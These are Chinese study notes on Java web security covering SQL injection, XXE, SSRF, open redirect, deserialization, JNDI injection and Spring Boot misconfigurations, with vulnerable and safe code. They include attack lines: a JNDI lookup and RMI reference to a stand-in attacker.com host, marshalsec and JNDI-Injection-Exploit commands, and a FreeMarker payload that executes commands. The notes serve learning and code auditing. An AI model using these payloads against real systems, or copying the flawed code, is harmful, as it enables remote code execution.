



[TOC]

# 一、JAVA基础

## 1、Listen、Filter、Servlet

```
src/
└── main/
    ├── java/
    │   └── com/
    │       └── example/
    │           ├── MyServlet.java      # Servlet类
    │           ├── AuthFilter.java     # Filter类
    │           └── AppListener.java    # Listener类
    └── webapp/
        └── WEB-INF/
            └── web.xml                 # 配置文件（可选）
```

#### 三者关系：

请求->Listen->Filter->Servlet

回复<-Listen<-Filter<-Servlet

#### 创建：

​	其实就是在对应目录下，创建，Listen/Filter/Servlet.java文件

Servlet.java：

```
public class ServletTemplate extends HttpServlet {
	init()
	destroy()
	doGet()
	doPost()
	....
}
```

Filter.java:

```
public class FilterTemplate implements Filter {
	init();//在服务启动时执行
	doFilter();
	destroy();
	....
}
```

Listen.java:

```
public class ListenerTemplate implements 
        ServletContextListener,   // 应用生命周期监听
        HttpSessionListener,      // Session生命周期监听
        ServletRequestListener,   // 请求生命周期监听
        HttpSessionAttributeListener { // Session属性监听


contextInitialized();//在服务启动时执行
contextDestroyed();
sessionCreated();
sessionDestroyed();

}
```

#### 路由设定：

(1) 注解方式 

```
@Webxxx(
    urlPatterns = {
        "/main",                    // 精确匹配
        "/api/*",                   // 路径前缀匹配
        "*.do",                     // 扩展名匹配
        "/user/{userId}/profile"    // 路径参数（需框架支持）
    },
    name = "xxx",
    loadOnStartup = 1
)
```

(2) web.xml

```
<xxx>
    <xxx-name>xxx</xxx-name>
    <xxx-class>com.example.Mainxxx</xxx-class>
    <load-on-startup>1</load-on-startup>
</xxx>
<xxx-mapping>
    <xxx-name>Mainxxx</xxx-name>
    <url-pattern>/main</url-pattern>
    <url-pattern>/api/*</url-pattern>
    <url-pattern>*.do</url-pattern>
</xxx-mapping>
```

#### 重要对象：

```
HttpServletRequest
HttpServletResponse
```

## 2、反射机制

#### 一、本质

​	灵活地获取/调用/修改，任何指定的类、对象、成员函数，构造函数

#### 二、意义

1. 反序列化链的实现/编写

   ```
   构造反序列化利用链，要维持链条不断，某些类必须设置值，以满足条件，要设置这些值，就需要反射机制
   ```

2. 内存马的植入

   ```
   使用反射机制植入内存马（生成Sevlet、Listen、Filter的代码）
   ```

#### 三、方法

##### 获取类：

```
Class<?> clazz = Class.forName("java.lang.String"); // 全限定类名
```

``` 
User user = new User();
Class<? extends User> clazz = user.getClass();  // 返回 User 的 Class 对象
```

```
User user = new User();
Class clazz = user.Class();  // 返回 User 的 Class 对象
```

```
# 类加载器
ClassLoader loader = ClassLoader.getSystemClassLoader();
Class<?> clazz = loader.loadClass("java.lang.String"); 
```

##### 获取对象:

- `getFields()`
- `getField(String name)`
- `getDeclaredFields()`
- `getDeclaredField(String name)`

##### 获取对象方法：

- `getMethods()`

- `getMethod(String name, Class<?>... paramTypes)`

- `getDeclaredMethods()`

- `getDeclaredMethod(String name, Class<?>... paramTypes)`

- 调用获取的对象方法

  ```
  Method method = clazz.getDeclaredMethod("methodName");
  method.setAccessible(true);
  method.invoke(instance); // 调用方法
  ```

##### 获取构造方法：

- `getConstructors()`

- `getConstructor(Class<?>... paramTypes)`

- `getDeclaredConstructors()`

- `getDeclaredConstructor(Class<?>... paramTypes)`

- 调用获取的构造方法

  ```
  Constructor<?> constructor = clazz.getConstructor();
  Object instance = constructor.newInstance(); // 调用无参构造
  ```

##### 暴力反射函数：setAccessible(true)

1. 访问 `private` 私有成员（字段/方法/构造器）
2. 访问 `protected` 受保护成员
3. 访问包级私有（默认权限）成员
4. **绕过 final 修饰符的限制**（如修改 final 字段的值）
5. 需要set的时候

## 3、jdk动态代理，invoke的隐式调用

#### 意义：

​	对于分析反序列化链有帮助

#### 调用invoke:

```
PaymentService realService = new PaymentServiceImpl();

PaymentService proxy = (PaymentService) Proxy.newProxyInstance(
    realService.getClass().getClassLoader(), // 类加载器
    realService.getClass().getInterfaces(),  // 代理接口
    new PaymentInvocationHandler(realService) // 调用处理器，调用PaymentInvocationHandler类中的invoke!!!
);
```

## 4、序列化/反序列化

反序列化分为，原生反序列化、依赖反序列化，就是在不同的"土地"上构造出可利用的反序列化链。

注意：

1. 找反序列化利用链、找反序列化漏洞是两回事，前者找route->sink，后者找sink
2. 构造反序列化链过程中，类必须继承Serializable才可被序列化
3. 序列化数据有很多种

## 5、JWT

##### 代码逻辑：

1. 用户发送账号密码给后端
2. 后端将这个账号密码生成JWT（使用某种加密，某个密钥）

##### JWT作用：

1. 防止身份校验数据能被修改/爆破，jwt特点在于能解密，但是加密则需要使用后端同样的密钥加密，不然后端解密失败

# 二、原生安全

## 1、SQLI

#### JDBC:

不安全：

```
sql = "INSERT INTO sqli (username, password) VALUES ('" + username + "', '" + password + "')";
rowsAffected = stmt.executeUpdate(sql);
```

```
sql = "INSERT INTO sqli (username, password) VALUES ('" + username + "', '" + password + "')";
stmt = conn.prepareStatement(sql);
rowsAffected = stmt.executeUpdate(sql);
```

```
sql = "INSERT INTO sqli (username, password) VALUES ('" + username + "', '" + password + "')";
rowsAffected = jdbctemplate.update(sql);
```

安全：

```
// 这里可以看到使用了?占位符 sql语句和参数进行分离
sql = "INSERT INTO users (username, password) VALUES (?, ?)"; 
stmt = conn.prepareStatement(sql);
// 参数化处理
stmt.setString(ueditor, username); 
stmt.setString(2, password);
// 使用预编译时 不需要传递sql语句
rowsAffected = stmt.executeUpdate();
```

```
sql = "INSERT INTO sqli (username, password) VALUES (?,?)";
rowsAffected = jdbctemplate.update(sql, username, password);
```

#### Mybatis:

安全：

```
// 这里以增加功能为例
// Controller层
	rowsAffected = sqliService.customInsert(new Sqli(id, username, password));

// Service层
@Override
public int customInsert(Sqli user) {
    return sqliMapper.customInsert(user);
}

// Mapper层
<insert id="customInsert">
    insert into sqli (id,username,password) values (#{id,jdbcType=INTEGER},#{username,jdbcType=VARCHAR},#{password,jdbcType=VARCHAR})
</insert>
```

不安全:

```
// Controller层
	sqlis = sqliService.orderByVul(field);

// Service层
//自定义SQL-使用#{}
@Override
public List<Sqli> orderByVul(String field) {
    return sqliMapper.orderByVul(field);
}

// Mapper层
<!--    Order by下的${}拼接注入问题-->
<select id="orderByVul" resultType="top.whgojp.modules.sqli.entity.Sqli">
    SELECT * FROM sqli
    <if test="field != null and field != ''">
        ORDER BY ${field}
    </if>
</select>
```

#### Hibernate :

不安全:

```
String sql = "SELECT * FROM sqli WHERE username = '" + username + "'";
Object[] result = (Object[]) hibernateTemplate.execute(session ->
        session.createNativeQuery(sql).uniqueResult()
);
```

```
String hql = "FROM Sqli WHERE username = '" + username + "'";
Sqli result = (Sqli) hibernateTemplate.execute(session ->
        session.createQuery(hql).uniqueResult()
);
```

安全:

```
String hql = "FROM Sqli WHERE username = :username";
Sqli result = hibernateTemplate.execute(session ->
        (Sqli) session.createQuery(hql)
                .setParameter("username", username)
                .uniqueResult()
);
```

#### JPA：

不安全:

```
String jpql = "SELECT s FROM Sqli s WHERE s.username = '" + username + "'";
Query query = entityManager.createQuery(jpql);
List<Sqli> results = query.getResultList();
```

安全：

```
String jpql = "SELECT s FROM Sqli s WHERE s.username = :username";
Query query = entityManager.createQuery(jpql)
        .setParameter("username", username);
List<Sqli> results = query.getResultList();
```

## 2、XXE

##### Sink:

```
1、XMLReader
2、SAXReader
3、DocumentBuilder
4、XMLStreamReader
5、SAXBuilder
6、SAXParser
7、SAXSource
8、TransformerFactory
9、SAXTransformerFactory
10、SchemaFactory
11、Unmarshaller
12、XPathExpression
```

```
xmlReader.parse(new InputSource(new StringReader(payload)));
```

```
parser.parse(new InputSource(new StringReader(payload)), handler);
```

## 3、命令执行

##### SINK:

```
1、ProcessBuilder
2、Runtime.exec()
3、反射调用 ProcessImpl.start
```

## 4、代码执行

```
GroovyShell shell = new GroovyShell();
Object result = shell.evaluate(payload); 
```

## 5、SSRF

```
URL url = new URL(userInput);
HttpURLConnection connection = (HttpURLConnection) url.openConnection();
connection.setRequestMethod("GET");
connection.connect();
```

## 6、URL重定向

不安全：

1. Spring MVC

```
// 基于Spring MVC的重定向方式
// 通过返回带有 redirect: 前缀的字符串来实现重定向。
public String vul1(@RequestParam("url") String url) {
    return "redirect:" + url;   // Spring MVC写法 302临时重定向
}
```

```
// 通过返回 ModelAndView 对象并指定 redirect: 前缀来实现重定向。
public ModelAndView vul2(@RequestParam("url") String url) {
    return new ModelAndView("redirect:" + url); // Spring MVC写法 使用ModelAndView 302临时重定向
}
```

2. Servlet

```
// 基于Servlet标准的重定向方式
// 通过设置响应状态码和头部信息实现重定向。
public static void vul2(HttpServletRequest request, HttpServletResponse response) {
    String url = request.getParameter("url");
    response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301永久重定向
    response.setHeader("Location", url);
}
```

```
// 通过调用 HttpServletResponse.sendRedirect() 实现重定向。
public static void vul3(HttpServletRequest request, HttpServletResponse response) throws IOException {
    String url = request.getParameter("url");
    response.sendRedirect(url); // 302临时重定向
}
```

3. Spring注释+状态码

```
// 基于Spring注解和状态码的重定向方式
// 使用ResponseEntity设置状态码实现重定向
public ResponseEntity<Void> vul5(@RequestParam("url") String url) {
    HttpHeaders headers = new HttpHeaders();
    headers.setLocation(URI.create(url));
    return new ResponseEntity<>(headers, HttpStatus.FOUND); // 302临时重定向
}
```

```
// 通过注解设置状态码实现重定向
@ResponseStatus(HttpStatus.FOUND) // 302临时重定向
public void vul6(HttpServletRequest request, HttpServletResponse response) throws IOException {
    String url = request.getParameter("url");
    response.setHeader("Location", url);
}
```

安全：

1. Servlet内部跳转

```
// 内部跳转
public static void safe1(HttpServletRequest request, HttpServletResponse response) {
    String url = request.getParameter("url");
    RequestDispatcher rd = request.getRequestDispatcher(url);
    try {
        // 做了内部转发
        rd.forward(request, response);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

## 3、反序列化

#### Source:

```
原生:
	1. readObject
	2. XMLDecoder
fastjson:
	1. parse()
	2. parseObject()
Xstream:
	1. fromXML()
SnakeYmal:
	1. load()、loadAS()
```

#### Jump:（都是对象中的函数）

```
原生:
	无条件：
		1. readObject
			-> 反序列化直接执行
	有条件：
		1. totring
			-> 将反序列化后对象有输出操作时执行
fastjson:
	无条件：	
        1. set、get
            -> 反序列话操作直接执行
                (1、序列化固定类后：
                parse方法在调用时会调用set方法
                parseObject在调用时会调用set和get方法
                2、反序列化指定类后：
                parseObject在调用时会调用set方法)
Xstream:
	无条件：
        1. readObject
            -> 反序列化直接执行
SnakeYmal:
	无条件：
        1. set、构造函数
            -> 反序列化直接执行
```

#### Sink：

```
GetHostAddress() -> ssrf
InitialContext.lookup() -> jndi注入
```

## 4、JNDI注入

#### 一、原理

服务器此时作为客户端，向JNDI服务端发起请求：

```
// 漏洞代码示例
Context ctx = new InitialContext();
ctx.lookup("ldap://attacker.com:1389/Exploit");
```

JNDI服务端代码如下:

```
Registry registry = LocateRegistry.createRegistry(1099);
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/malicious/");
ReferenceWrapper refWrapper = new ReferenceWrapper(ref);
registry.bind("Exploit", refWrapper);
```

class文件所在服务器：

```
http://attacker.com/malicious/
class文件名，Exploit.class
```

#### 二、工具

##### 全自动：（JNDI服务器和CLASS服务器在一块）

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A xx.xx.xx.xx
```

##### 半自动：（需要自写java，编译成class，配置服务器）

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test

http://0.0.0.0/#Test:
	自己把Test.class放在http://0.0.0.0/服务器下
```

## 5、Swigger配置错误

```
@Bean
public Docket api() {
  return new Docket(DocumentationType.SWAGGER_2)
    .select()
    .apis(RequestHandlerSelectors.any())  // 扫描所有包（包括Spring内部）
    .paths(PathSelectors.any())
    .build();
}
```

- 暴露未授权的内部API接口
- 显示接口参数结构（可能含敏感字段）
- 提供API测试功能（可被攻击者直接调用）

1. 

# 三、SpringBoot安全

## 0、如何判断版本

```
pom.xml
```

## 1、配置文件

```
\src\main\resources\application.yml
\src\main\resources\application-dev.yml
```

## 2、控制层

```
\src\main\java\top\whgojp\modules
```

## 3、视图层

```
\src\main\resources\templates
```

## 4、路由映射

```
http://localhost/sqli/jdbc/vul1?
```

```
\src\main\java\top\whgojp\modules\sqli\controller\JdbcController.java
```

```
@GetMapping("/vul1")
```

在对应的方法前添加：@RequestMapping、@GetMapping、@PostMapping

## 5、框架安全

### 1. 模板引擎与漏洞

##### 工作原理：

1. 配置文件application.properties，配置：

   1. 模板文件目录
   2. 模板文件类型

2. 如何调用模板文件，直接return 什么，就调用什么

   ```
   @Controller
   public class IndexController {
       @RequestMapping("/index")
       public String index(Model model) {
   		//替换模版html文件中的data变量值
           model.addAttribute("data", "你好 小迪");
   		//使用index模版文件
           return "index";
       }
   ```

##### Thymeleaf：

1. return的参数可控

##### Freemarker：

1. 模板文件可控，插入

   ```
   <#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
   ```

### 2. Actuator 

Actuator 是 Spring Boot 官方提供的资源监控模块

##### 配置错误：

```
# application.yml (危险示例)
management:
  endpoints:
    web:
      exposure:
        include: '*'  # 暴露所有端点
  endpoint:
    health:
      show-details: always  # 无认证显示详情
    shutdown:
      enabled: true   # 开放关闭应用权限
  server:
    port: 8080  # 与应用端口相同
```

- `/env` 泄露数据库密码
- `/heapdump` 下载内存数据
  1. 泄露配置文件的敏感信息
- `/shutdown` 被恶意关闭服务
- `/mappings` 暴露内部接口

### 3. Spring Security

SpringBoot自带的多页面、多用户身份校验框架。

```
.requestMatchers("/", "/home").permitAll()
.requestMatchers("/user/**").hasRole("USER")	//访问/user/下的任何内容需要USER权限
.requestMatchers("/admin/**").hasRole("ADMIN")	//访问/admin/下的任何内容需要ADMIN权限
```

##### 配置错误：

```
  .requestMatchers("/user/").hasRole("USER")	//就只有访问/user/页面需要USER权限，下面的内容绕过 
```



